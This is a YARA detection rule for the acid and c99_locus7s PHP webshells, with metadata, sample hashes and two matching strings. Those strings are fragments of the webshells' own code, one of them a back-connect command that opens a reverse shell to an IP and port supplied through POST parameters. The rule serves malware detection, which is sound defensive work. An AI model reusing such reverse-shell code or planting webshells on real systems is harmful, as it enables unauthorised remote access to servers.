rule Webshell_27_9_acid_c99_locus7s
{
	meta:
		description = "Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "https://github.com/nikicat/web-malware-collection"
		date = "2016-01-11"
		score = 70
		hash1 = "2b8aed49f50acd0c1b89a399647e1218f2a8545da96631ac0882da28810eecc4"
		hash2 = "7a69466dbd18182ce7da5d9d1a9447228dcebd365e0fe855d0e02024f4117549"
		hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
		hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
		hash5 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
		hash6 = "5ae121f868555fba112ca2b1a9729d4414e795c39d14af9e599ce1f0e4e445d3"
		hash7 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
		hash8 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
		os = "windows,linux,macos,ios,android"
		filetype = "script"

	strings:
		$s0 = "$blah = ex($p2.\" /tmp/back \".$_POST['backconnectip'].\" \".$_POST['backconnectport'].\" &\");" fullword ascii
		$s1 = "$_POST['backcconnmsge']=\"</br></br><b><font color=red size=3>Error:</font> Can't backdoor host!</b>\";" fullword ascii

	condition:
		filesize <1711KB and 1 of them
}
